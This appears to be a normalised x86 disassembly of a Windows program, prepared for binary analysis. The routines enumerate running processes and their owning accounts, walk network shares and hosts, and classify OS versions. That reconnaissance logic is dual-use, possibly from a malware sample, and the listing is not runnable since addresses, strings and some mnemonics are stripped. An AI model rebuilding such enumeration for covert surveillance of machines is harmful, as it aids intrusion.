lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebx + ebp ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
sub_403940
sub esp 0x4c4
mov ecx [ esp + 0x4c8 ]
lea eax [ esp + 0x4 ]
push eax
push 0x20008
push ecx
mov [ esp + 0x14 ] 0x100
mov [ esp + 0xc ] 0xc8
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
push edx
lea eax [ esp + 0xe0 ]
push 0x3e8
push eax
push 0x1
push ecx
call [ GetTokenInformation@IAT ]
test eax eax
jne r-xdata
add esp 0x4c4
retn
lea edx [ esp + 0x10 ]
lea eax [ esp ]
push edx
lea ecx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x4d4 ]
lea edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0xe8 ]
push edx
push eax
push ecx
push 0x0
call [ LookupAccountSidA@IAT ]
neg eax
sbb eax eax
neg eax
add esp 0x4c4
retn
add esp 0x4c4
retn
sub_4039e0
sub esp 0x944
mov eax [ rw-data ]
push ebx
push ebp
xor ebp ebp
push esi
cmp eax 0x2
push edi
mov [ esp + 0x14 ] ebp
mov [ esp + 0x1c ] ebp
mov [ esp + 0x18 ] ebp
jne r-xdata
push ebp
push 0x2
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
mov [ esp + 0x10 ] ebx
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebp
mov [ esp + 0x14 ] edi
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
cmp eax ebp
pop ebp
pop ebx
je r-xdata
lea eax [ esp + 0x2c ]
mov [ esp + 0x2c ] 0x128
push eax
push ebx
call Process32First
test eax eax
je r-xdata
mov ebx [ esp + 0x10 ]
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push edi
call esi
mov ebx eax
push rw-data
push edi
mov [ esp + 0x24 ] ebx
call esi
cmp ebx ebp
mov [ esp + 0x18 ] eax
je r-xdata
add esp 0x944
retn
push eax
call [ FreeLibrary@IAT ]
cmp ebx 0xffffffff
je r-xdata
push rw-data
call sub_4033b0
mov ebp [ GetPriorityClass@IAT ]
add esp 0x4
cmp eax ebp
je r-xdata
push ebx
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x1
jne r-xdata
mov edx [ esp + 0x34 ]
push 0x410
push edx
call sub_403690
add esp 0x8
mov ebx eax
lea eax [ esp + 0x28 ]
lea ecx [ esp + 0x20 ]
push eax
push 0x4
push ecx
push ebx
call [ esp + 0x2c ]
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
test eax eax
jne r-xdata
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x254 ]
[ edi ]
not ecx
sub edi ecx
push 0x5c
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x28 ] 0x100
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x458 ]
push ecx
call sub_40c390
add esp 0x8
inc eax
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x654 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x454 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x654 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x154 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x24 ]
push ecx
push edx
call [ GetUserNameA@IAT ]
lea edx [ esp + 0x154 ]
push edx
push ebx
call sub_403940
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x20 ]
lea edx [ esp + 0x254 ]
push 0x200
push edx
push eax
push ebx
call [ esp + 0x28 ]
lea ecx [ esp + 0x254 ]
push ecx
call sub_403810
add esp 0x4
lea ecx [ esp + 0x454 ]
push rw-data
push ecx
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x454 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x254 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push ebx
call [ CloseHandle@IAT ]
mov ebx [ esp + 0x10 ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x154 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x40 ]
mov eax [ esp + 0x34 ]
lea edx [ esp + 0x154 ]
push ecx
push edx
lea ecx [ esp + 0x25c ]
push eax
lea edx [ esp + 0x460 ]
push ecx
push edx
lea eax [ esp + 0x768 ]
push rw-data
push eax
call sub_40c272
lea ecx [ esp + 0x770 ]
push ecx
call sub_4033b0
add esp 0x20
lea edx [ esp + 0x2c ]
push edx
push ebx
call Process32Next
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x254 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x454 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x34 ]
push ecx
push 0x0
push 0x410
call [ rw-data ]
mov esi eax
push esi
call ebp
push esi
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x2
jne r-xdata
xor ebp ebp
sub_403d50
sub esp 0x20
xor eax eax
mov ecx 0x2
mov [ esp + 0x4 ] eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
lea eax [ esp ]
push eax
mov [ esp + 0x4 ] ecx
mov [ esp + 0xc ] 0x3
mov [ esp + 0x10 ] ecx
call sub_403d90
add esp 0x24
retn
sub_403d90
sub esp 0x5d4
push ebx
push rw-data
call sub_4033b0
mov ecx [ esp + 0x5e0 ]
add esp 0x4
lea eax [ esp + 0x10 ]
xor ebx ebx
push eax
push ecx
push ebx
push ebx
push 0x2
mov [ esp + 0x1c ] 0x4000
mov [ esp + 0x18 ] 0xffffffff
call [ rw-data ]
test eax eax
je r-xdata
mov edx [ esp + 0x8 ]
push ebp
push esi
push edi
push edx
push 0x40
call [ GlobalAlloc@IAT ]
mov ebp eax
mov [ esp + 0x20 ] ebp
xor eax eax
pop ebx
add esp 0x5d4
retn
push ebp
call [ GlobalFree@IAT ]
mov eax [ esp + 0x1c ]
push eax
call WNetCloseEnum
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
inc eax
pop ebx
add esp 0x5d4
retn
mov eax [ esp + 0x10 ]
mov [ esp + 0x18 ] ebx
cmp eax ebx
jbe r-xdata
mov ecx [ esp + 0x14 ]
xor eax eax
mov edx ecx
mov edi ebp
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edx [ esp + 0x1c ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x14 ]
push ebp
push ecx
push edx
call [ rw-data ]
cmp eax ebx
jne r-xdata
add ebp 0x14
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x4 ]
cmp edi ebx
je r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
lea ebx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebx
mov ebx ecx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ ebp - 0x10 ]
mov ecx ebx
xor ebx ebx
and ecx 0x3
cmp eax ebx
[ edi ] [ esi ]
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp + 0x4 ]
cmp edi ebx
je r-xdata
or ecx 0xffffffff
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
cmp [ edx ] 0x5c
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
or ecx 0xffffffff
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ edx + 0x2 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x4e4 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x4e4 ]
push ecx
call gethostbyname
cmp eax ebx
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0xe4 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_4033b0
mov ecx [ ebp - 0x8 ]
add esp 0x4
and ecx 0x2
cmp cl 0x2
jne r-xdata
or ecx 0xffffffff
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edx [ eax + 0xc ]
mov eax [ edx ]
mov ecx [ eax ]
push ecx
call inet_ntoa
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x24 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x64 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x24 ]
push ecx
push rw-data
push edx
call sub_40c272
lea edi [ esp + 0x70 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xe4 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x10 ]
inc eax
add ebp 0x20
cmp eax ecx
mov [ esp + 0x18 ] eax
jb r-xdata
lea edx [ ebp - 0x14 ]
push edx
call sub_403d90
add esp 0x4
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xe4 ]
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x24 ] bl
mov eax ecx
mov esi edi
mov edi edx
mov edx [ ebp ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
cmp edx ebx
[ edi ] [ esi ]
je r-xdata
mov ebp [ esp + 0x20 ]
jmp r-xdata
sub_404120
sub esp 0x120
mov dl [ rw-data ]
push ebx
push esi
push edi
mov ecx 0x7
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xf
xor eax eax
lea edi [ esp + 0x2d ]
mov [ esp + 0x2c ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xf
xor eax eax
lea edi [ esp + 0x6d ]
mov [ esp + 0x6c ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xf
xor eax eax
lea edi [ esp + 0xad ]
mov [ esp + 0xac ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xf
xor eax eax
lea edi [ esp + 0xed ]
mov [ esp + 0xec ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x6c ]
push eax
call sub_404630
mov ebx [ esp + 0x134 ]
add esp 0x4
mov eax [ ebx + 0x10 ]
sub eax 0x0
je r-xdata
lea edx [ esp + 0xc ]
mov edi rw-data
dec eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ ebx + 0x4 ]
and ecx 0x3
cmp eax 0x4
[ edi ] [ esi ]
jne r-xdata
dec eax
je r-xdata
or ecx 0xffffffff
lea edi [ esp + 0xc ]
xor eax eax
mov edx [ esp + 0x134 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov ebx ecx
mov esi edi
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
lea edi [ esp + 0x2c ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x6c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov ebx ecx
mov esi edi
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
lea edi [ esp + 0xac ]
[ edi ]
not ecx
sub edi ecx
mov ebx ecx
mov esi edi
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0xec ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0x120
retn
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0x5
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0x120
retn
cmp eax 0xa
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xc ]
mov eax ecx
mov esi edi
mov edi edx
mov bl [ ebx + 0x15 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
cmp bl 0x43
[ edi ] [ esi ]
je r-xdata
mov edx [ ebx + 0x8 ]
push edx
push eax
lea eax [ esp + 0x14 ]
push rw-data
push eax
call sub_40c272
add esp 0x10
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
cmp eax 0x5a
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov al [ ebx + 0x15 ]
and ecx 0x3
cmp al 0x41
[ edi ] [ esi ]
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
jmp r-xdata
cmp bl 0x42
jne r-xdata
lea edx [ esp + 0x2c ]
mov edi rw-data
mov al [ ebx + 0x9a ]
cmp al 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xc ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
lea edx [ esp + 0xc ]
mov edi rw-data
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
jmp r-xdata
and ecx 0x3
[ edi ] [ esi ]
cmp al 0x3
jne r-xdata
test [ ebx + 0x99 ] 0x2
lea edx [ esp + 0x2c ]
je r-xdata
cmp eax 0x2
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
cmp [ ebx ] 0x9c
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea edi [ ebx + 0x14 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xac ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xec ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0xc ]
and ecx 0xffff
push ecx
push rw-data
push edx
call sub_40c272
add esp 0xc
jmp r-xdata
mov ax [ ebx + 0x98 ]
test al 0x80
je r-xdata
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
push eax
lea ecx [ esp + 0x10 ]
push rw-data
push ecx
call sub_40c272
add esp 0xc
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
test al 0x2
lea edx [ esp + 0x2c ]
je r-xdata
lea edx [ esp + 0x2c ]
mov edi rw-data
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
jmp r-xdata
mov edi rw-data
jmp r-xdata
sub_404630
sub esp 0x534
push ebx
push ebp
push esi
push edi
mov ebx 0x1
xor eax eax
mov ecx 0x2
mov ebp 0x3
mov edx 0x4
mov edi 0x5
mov esi 0x6
mov [ esp + 0x14 ] 0x36
mov [ esp + 0x16 ] bx
mov [ esp + 0x18 ] rw-data
mov [ esp + 0x1c ] 0x1c
mov [ esp + 0x1e ] bx
mov [ esp + 0x20 ] rw-data
mov [ esp + 0x24 ] bx
mov [ esp + 0x26 ] 0x11
mov [ esp + 0x28 ] rw-data
mov [ esp + 0x2c ] bx
mov [ esp + 0x2e ] ax
mov [ esp + 0x30 ] rw-data
mov [ esp + 0x34 ] cx
mov [ esp + 0x36 ] ax
mov [ esp + 0x38 ] rw-data
mov [ esp + 0x3c ] bp
mov [ esp + 0x3e ] ax
mov [ esp + 0x40 ] rw-data
mov [ esp + 0x44 ] dx
mov [ esp + 0x46 ] ax
mov [ esp + 0x48 ] rw-data
mov [ esp + 0x4c ] di
mov [ esp + 0x4e ] ax
mov [ esp + 0x50 ] rw-data
mov [ esp + 0x54 ] si
mov [ esp + 0x56 ] ax
mov [ esp + 0x58 ] rw-data
mov [ esp + 0x5c ] 0x7
mov [ esp + 0x5e ] ax
mov [ esp + 0x60 ] rw-data
mov [ esp + 0x64 ] 0x8
mov [ esp + 0x66 ] ax
mov [ esp + 0x68 ] rw-data
mov [ esp + 0x6c ] 0x9
mov [ esp + 0x6e ] ax
mov [ esp + 0x70 ] rw-data
mov [ esp + 0x74 ] 0xa
mov [ esp + 0x76 ] ax
mov [ esp + 0x78 ] rw-data
mov [ esp + 0x7c ] 0xb
mov [ esp + 0x7e ] ax
mov [ esp + 0x80 ] rw-data
mov [ esp + 0x84 ] 0xc
mov [ esp + 0x86 ] ax
mov [ esp + 0x88 ] rw-data
mov [ esp + 0x8c ] 0xd
mov [ esp + 0x8e ] ax
mov [ esp + 0x90 ] rw-data
mov [ esp + 0x94 ] 0xe
mov [ esp + 0x96 ] ax
mov [ esp + 0x98 ] rw-data
mov [ esp + 0x9c ] 0xf
mov [ esp + 0x9e ] ax
mov [ esp + 0xa0 ] rw-data
mov [ esp + 0xa4 ] 0x10
mov [ esp + 0xa6 ] ax
mov [ esp + 0xa8 ] rw-data
mov [ esp + 0xac ] 0x2b
mov [ esp + 0xae ] bx
mov [ esp + 0xb0 ] rw-data
mov [ esp + 0xb4 ] 0x4d
mov [ esp + 0xb6 ] bx
mov [ esp + 0xb8 ] rw-data
mov [ esp + 0xbc ] 0x2c
mov [ esp + 0xbe ] bp
mov [ esp + 0xc0 ] rw-data
mov [ esp + 0xc4 ] bx
mov [ esp + 0xc6 ] ax
mov [ esp + 0xc8 ] rw-data
mov [ esp + 0xcc ] cx
mov [ esp + 0xce ] ax
mov [ esp + 0xd0 ] rw-data
mov [ esp + 0xd4 ] 0x2d
mov [ esp + 0xd6 ] bx
mov [ esp + 0xd8 ] rw-data
mov [ esp + 0xdc ] 0x23
mov [ esp + 0xde ] bx
mov [ esp + 0xe0 ] rw-data
mov [ esp + 0xe4 ] 0x45
mov [ esp + 0xe6 ] bx
mov [ esp + 0xe8 ] rw-data
mov [ esp + 0xec ] cx
mov [ esp + 0xee ] bx
mov [ esp + 0xf0 ] rw-data
mov [ esp + 0xf4 ] bp
mov [ esp + 0xf6 ] bx
mov [ esp + 0xf8 ] rw-data
mov [ esp + 0xfc ] dx
mov [ esp + 0xfe ] si
mov [ esp + 0x100 ] rw-data
mov [ esp + 0x104 ] bx
mov [ esp + 0x106 ] ax
mov [ esp + 0x108 ] rw-data
mov [ esp + 0x10c ] cx
mov [ esp + 0x10e ] ax
mov [ esp + 0x110 ] rw-data
mov [ esp + 0x114 ] bp
mov [ esp + 0x116 ] ax
mov [ esp + 0x118 ] rw-data
mov [ esp + 0x11c ] dx
mov [ esp + 0x11e ] ax
mov [ esp + 0x120 ] rw-data
mov [ esp + 0x124 ] di
mov [ esp + 0x126 ] ax
mov [ esp + 0x128 ] rw-data
mov [ esp + 0x12c ] di
mov [ esp + 0x12e ] bx
mov [ esp + 0x130 ] rw-data
mov [ esp + 0x134 ] si
mov [ esp + 0x136 ] bx
mov [ esp + 0x138 ] rw-data
mov [ esp + 0x13c ] 0x13
mov [ esp + 0x13e ] bp
mov [ esp + 0x140 ] rw-data
mov [ esp + 0x144 ] bx
mov [ esp + 0x146 ] ax
mov [ esp + 0x148 ] rw-data
mov [ esp + 0x14c ] cx
mov [ esp + 0x14e ] ax
mov [ esp + 0x150 ] rw-data
mov [ esp + 0x154 ] 0x9
mov [ esp + 0x156 ] 0xe
mov [ esp + 0x158 ] rw-data
mov [ esp + 0x15c ] bx
mov [ esp + 0x15e ] ax
mov [ esp + 0x160 ] rw-data
mov [ esp + 0x164 ] cx
mov [ esp + 0x166 ] ax
mov [ esp + 0x168 ] rw-data
mov [ esp + 0x16c ] bp
mov [ esp + 0x16e ] ax
mov [ esp + 0x170 ] rw-data
mov [ esp + 0x174 ] dx
mov [ esp + 0x176 ] ax
mov [ esp + 0x178 ] rw-data
mov [ esp + 0x17c ] di
mov [ esp + 0x17e ] ax
mov [ esp + 0x180 ] rw-data
mov [ esp + 0x184 ] si
mov [ esp + 0x186 ] ax
mov [ esp + 0x188 ] rw-data
mov [ esp + 0x18c ] 0x7
mov [ esp + 0x18e ] ax
mov [ esp + 0x190 ] rw-data
mov [ esp + 0x194 ] 0x8
mov [ esp + 0x196 ] ax
mov [ esp + 0x198 ] rw-data
mov [ esp + 0x19c ] 0x9
mov [ esp + 0x19e ] ax
mov [ esp + 0x1a0 ] rw-data
mov [ esp + 0x1a4 ] 0xa
mov [ esp + 0x1a6 ] ax
mov [ esp + 0x1a8 ] rw-data
mov [ esp + 0x1ac ] 0xb
mov [ esp + 0x1ae ] ax
mov [ esp + 0x1b0 ] rw-data
mov [ esp + 0x1b4 ] 0xc
mov [ esp + 0x1b6 ] ax
mov [ esp + 0x1b8 ] rw-data
mov [ esp + 0x1bc ] 0xd
mov [ esp + 0x1be ] ax
mov [ esp + 0x1c0 ] rw-data
mov [ esp + 0x1c4 ] 0x25
mov [ esp + 0x1c6 ] bx
mov [ esp + 0x1c8 ] rw-data
mov [ esp + 0x1cc ] 0x38
mov [ esp + 0x1ce ] bx
mov [ esp + 0x1d0 ] rw-data
mov [ esp + 0x1d4 ] 0x29
mov [ esp + 0x1d6 ] bx
mov [ esp + 0x1d8 ] rw-data
mov [ esp + 0x1dc ] 0xb
mov [ esp + 0x1de ] bx
mov [ esp + 0x1e0 ] rw-data
mov [ esp + 0x1e4 ] 0xc
mov [ esp + 0x1e6 ] 0x7
mov [ esp + 0x1e8 ] rw-data
mov [ esp + 0x1ec ] bx
mov [ esp + 0x1ee ] ax
